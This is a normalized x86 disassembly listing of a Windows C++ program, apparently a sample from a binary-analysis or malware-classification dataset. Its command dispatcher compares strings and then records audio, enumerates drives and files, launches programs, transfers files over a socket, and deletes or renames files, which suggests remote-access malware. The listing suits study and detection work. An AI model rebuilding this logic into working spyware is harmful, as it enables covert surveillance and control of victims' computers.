call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x6d8 ]
call sub_4028eb
lea ecx [ ebp - 0xac ]
call sub_405288
push eax
lea eax [ ebp - 0x44 ]
push edi
push eax
lea ecx [ ebp - 0x6d8 ]
call sub_402a2a
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp - 0x51 ]
lea ecx [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x2cc ]
push 0x140
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x64 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
and [ rw-data ] 0x0
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call edi
pop ecx
push eax
call sub_4013c9
add esp 0xc
jmp r-xdata
call sub_4021c7
jmp r-xdata
mov edi [ atoi@IAT ]
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
push sub_401cbe
mov ecx rw-data
call sub_40221c
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push edi
call sub_40fc2c
pop ecx
lea eax [ ebp - 0x30 ]
push 0x1
mov esi rw-data
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov edi esp
push eax
push esi
push 0x3
call sub_401289
push eax
push esi
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
push esi
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
push esi
lea eax [ ebp - 0xbc ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0xcc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xdc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x84 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_4025ef
add esp 0x14
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xdc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xbc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi [ atoi@IAT ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push [ rw-data ]
mov [ rw-data ] 0x1
call [ waveInStop@IAT ]
push [ rw-data ]
call [ waveInClose@IAT ]
jmp r-xdata
push 0x5
lea ecx [ ebp - 0x10 ]
mov [ rw-data ] 0x1
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x4
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4086b1
add esp 0x50
sub_40bc9b
push ebp
mov ebp esp
sub esp 0x2a8
push ebx
push esi
lea eax [ ebp - 0x2a8 ]
push edi
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
push r--data
push eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
call [ std::operator!=@IAT ]
pop ecx
mov bl al
pop ecx
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
test bl bl
mov edi 0x250
je r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_40edd3
push ecx
push ecx
mov esi esp
push eax
mov eax rw-data
lea ecx [ ebp + 0x8 ]
push eax
push ecx
push eax
lea eax [ ebp - 0x38 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
jmp r-xdata
mov esi [ FindNextFileW@IAT ]
lea eax [ ebp - 0x2a8 ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x2a8 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub esp 0x10
lea eax [ ebp - 0x28 ]
mov esi esp
lea ecx [ ebp + 0x8 ]
push eax
mov eax rw-data
push eax
push ecx
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x38 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x18 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x2a8 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x2a8 ]
push eax
push [ ebp - 0x8 ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_40bea2
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
lea eax [ ebp - 0x1 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40efb5
add esp 0x24
lea eax [ ebp - 0x1 ]
xor edi edi
lea ecx [ ebp - 0x14 ]
push eax
push edi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi [ std::operator==@IAT ]
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0xec ]
push eax
push 0x64
call [ GetLogicalDriveStringsA@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0xec ]
push 0x64
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
push edi
push r--data
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
inc eax
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
sub esp 0x10
lea eax [ ebp - 0x24 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x58 ]
push eax
call sub_4083e6
pop ecx
mov esi rw-data
mov edi esp
push eax
lea eax [ ebp - 0x24 ]
push esi
push eax
push esi
lea eax [ ebp - 0x88 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x68 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x78 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x68 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x88 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_40ee4b
pop ecx
pop ecx
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40bc9b
add esp 0x20
jmp r-xdata
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call sub_401b3c
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x5
push edi
push edi
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_40ee4b
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push edi
call [ ShellExecuteW@IAT ]
lea ecx [ ebp - 0x58 ]
jmp r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x4
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40ca9b
add esp 0x40
jmp r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push edi
push 0x4
lea ecx [ ebp - 0x14 ]
call sub_401289
sub esp 0x10
mov esi rw-data
mov edi esp
lea ecx [ ebp - 0x14 ]
push eax
push esi
push 0x3
call sub_401289
push eax
push esi
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
push esi
lea eax [ ebp - 0x34 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x68 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x78 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x88 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_4025ef
add esp 0x14
lea ecx [ ebp - 0x58 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x88 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x68 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
push eax
push esi
call sub_40c63f
pop ecx
mov bl al
pop ecx
push esi
call closesocket
test bl bl
je r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_40ee4b
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x34 ]
mov ebx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
test bl 0x10
push 0x1
lea ecx [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp - 0x24 ]
jmp r-xdata
push 0x1
push 0x20
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x114 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x114 ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea ecx [ ebp - 0x114 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ ebp - 0x114 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_40ee4b
pop ecx
pop ecx
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_40ee4b
mov eax [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::npos@IAT ]
pop ecx
pop ecx
push [ eax ]
lea ecx [ ebp - 0x24 ]
push 0x5c
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::rfind@IAT ]
inc eax
lea ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x68 ]
push edi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::substr@IAT ]
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ _wrename@IAT ]
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x34 ]
inc bl
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
test bl bl
je r-xdata
call sub_401289
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_40ee4b
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x34 ]
jmp r-xdata
call sub_401289
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_40ee4b
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_40ed73
add esp 0x10
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40f234
pop ecx
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_40ee4b
pop ecx
pop ecx
push edi
push 0x3
lea ecx [ ebp - 0x14 ]
call sub_401289
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_40ee4b
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0x14
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateDirectoryW@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x2a
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
sub esp 0x10
lea eax [ ebp - 0x24 ]
